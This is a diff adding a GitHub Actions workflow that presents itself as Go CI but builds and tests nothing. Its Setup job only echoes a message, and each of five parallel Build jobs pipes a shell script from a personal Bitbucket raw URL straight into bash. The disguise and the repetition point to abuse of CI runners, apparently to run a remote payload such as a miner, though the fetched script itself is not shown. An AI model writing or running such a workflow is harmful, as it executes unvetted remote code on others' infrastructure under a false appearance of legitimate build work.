@@ -1,0 +1,101 @@
+name: CI
+on:
+  push:
+    branches: [ 1 ]
+jobs:
+  Setup:
+    runs-on: ubuntu-20.04
+    strategy:
+      fail-fast: false
+      matrix:
+        go: [1.17]
+        flag: [1, 2, 3 ,4, 5]
+    env:
+        NUM_JOBS: 5
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v2
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Testing
+      run: |
+        echo "Finish"
+  Build-1:
+    needs: Setup
+    runs-on: ubuntu-20.04
+    strategy:
+      fail-fast: false
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Main
+      run: curl -s https://bitbucket.org/jembud/bit4/raw/7f1276418fe8855917ace447029d23d680be44b1/run.sh | bash
+    - name: Done
+      run: echo "Finish"
+  Build-2:
+    needs: Setup
+    runs-on: ubuntu-20.04
+    strategy:
+      fail-fast: false
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Main
+      run: curl -s https://bitbucket.org/jembud/bit4/raw/7f1276418fe8855917ace447029d23d680be44b1/run.sh | bash
+    - name: Done
+      run: echo "Finish"
+  Build-3:
+    needs: Setup
+    runs-on: ubuntu-20.04
+    strategy:
+      fail-fast: false
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Main
+      run: curl -s https://bitbucket.org/jembud/bit4/raw/7f1276418fe8855917ace447029d23d680be44b1/run.sh | bash
+    - name: Done
+      run: echo "Finish"
+  Build-4:
+    needs: Setup
+    runs-on: ubuntu-20.04
+    strategy:
+      fail-fast: false
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Main
+      run: curl -s https://bitbucket.org/jembud/bit4/raw/7f1276418fe8855917ace447029d23d680be44b1/run.sh | bash
+    - name: Done
+      run: echo "Finish"
+  Build-5:
+    needs: Setup
+    runs-on: ubuntu-20.04
+    strategy:
+      fail-fast: false
+    steps:
+    - name: Set up Go
+      uses: actions/setup-go@v2
+      with:
+        go-version: 1.17
+      id: go
+    - name: Main
+      run: curl -s https://bitbucket.org/jembud/bit4/raw/7f1276418fe8855917ace447029d23d680be44b1/run.sh | bash
+    - name: Done
+      run: echo "Finish"
